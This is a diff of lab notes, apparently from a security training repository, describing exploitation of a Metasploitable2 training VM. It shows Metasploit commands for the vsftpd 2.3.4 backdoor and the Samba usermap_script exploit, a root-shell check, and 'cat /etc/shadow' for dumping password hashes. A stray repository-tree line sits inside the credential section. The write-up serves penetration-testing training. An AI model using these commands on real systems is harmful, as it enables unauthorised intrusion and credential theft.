@@ -37,24 +37,27 @@ nmap -sV -sC -O -v -o nmap_scan_output.txt 192.168.56.10
 - vnc 
 - irc
 
-### Metasploitable2 exposes many vulnerable services for training, which provides hands on experience for learners to exploit on numerous ways. 
+
+Metasploitable2 exposes many vulnerable services for training, which provides hands on experience for learners to exploit on numerous ways. 
 
 
 
-# FTP Exploitation Attempt
+## FTP Exploitation Attempt
 
-## ** Target Service **
-vsfpd 2.3.4 backdoor (decoy)
+** Target Service 
+> vsfpd 2.3.4 backdoor (decoy)
 
-### Metasploit module:
+Metasploit module:
 
-''' msfconsole 
+```bash
+	 msfconsole 
 	use exploit/unix/ftp/vsfpd_234_backdoor
 	set RHOSTS 192.168.56.10
-	exploit'''
+	exploit
+```
 
 
-### Result:
+Result:
 - Root shell achieved once
 - Subsequent attempts failed
 - Anonymous ftp login showed, it was allowed but not useful
@@ -66,11 +69,11 @@ vsfpd 2.3.4 backdoor (decoy)
 
 
 
-#Samba Exploitation (True Success)
+## Samba Exploitation (True Success)
 
-## ** Target Service **
-# samba 3.0.20
-#Metasploit exploit:
+** Target Service **
+samba 3.0.20
+Metasploit exploit:
 
 '''msfconsole
 	use exploit/multi/samba/usermap_script
@@ -78,27 +81,31 @@ vsfpd 2.3.4 backdoor (decoy)
 	set RPORT 445
 	exploit '''
 
-#Result:
+Result:
 - Root shell obtain
 - Full access to the victim machine
 
 # Verification
 
-'''whoami
-	root'''
+```bash
+	whoami
+	root
+```
 
 
 
 ## Post-Exploitation
 
-#After gaining root:
-#Directory exploration:
+# After gaining root:
+# Directory exploration:
 
-''' ls /
+```bash
+	ls /
 	ls /var
 	ls /home
 	ls /root
-	'''
+```
+
 
 # Discovered:
 - Web Application Directories (TikiWiki)
@@ -107,10 +114,11 @@ vsfpd 2.3.4 backdoor (decoy)
 - Vulnerable services directories
 
 
+
 ## Credential Harvesting 
 
 # Dumped Password Hashes:
-
+5-weeks-security-engineer-training/ ├── week1/ # Enumeration & initial exploitation │ ├── week1_notes.md # Lab notes and methodology │ ├── auto_enumeration.py# Custom scanning script │ └── screenshots/ # Evidence & lab screenshots ├── week2/ # Advanced web/API security ├── week3/ # OS & mobile exploitation ├── week4/ # AI security & automation └── week5/ # Job readiness & final projects
 ''' cat /etc/shadow'''
 
 # Found multiple user accounts including :
